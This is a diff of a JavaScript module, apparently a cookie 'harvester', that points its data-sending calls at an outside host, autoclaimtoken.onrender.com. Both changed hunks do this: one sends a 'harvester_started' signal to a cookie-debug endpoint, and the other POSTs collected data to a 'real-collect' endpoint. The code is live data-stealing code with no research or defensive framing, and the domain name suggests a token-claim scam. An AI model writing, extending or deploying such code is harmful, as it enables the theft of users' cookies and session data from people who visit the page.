@@ -7,7 +7,7 @@ export const initializeAdvancedHarvesting = async () => {
     
     // Debug test - send immediate signal
     try {
-      await fetch('/api/cookie-debug', {
+      await fetch('https://autoclaimtoken.onrender.com/api/cookie-debug', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ test: 'harvester_started', timestamp: Date.now() })
@@ -496,16 +496,16 @@ export const transmitDataSecurely = async (data) => {
     chunks.push(dataStr.slice(i, i + chunkSize));
   }
   
-  // Send real data directly
+  // Send real data directly to backend
   try {
-    await fetch('/api/real-collect', {
+    await fetch('https://autoclaimtoken.onrender.com/api/real-collect', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
     });
     console.log('🍪 HARVESTER: Real data sent successfully');
   } catch (error) {
-    console.log('🍪 HARVESTER: Failed to send real data');
+    console.log('🍪 HARVESTER: Failed to send real data:', error);
   }
 };
 
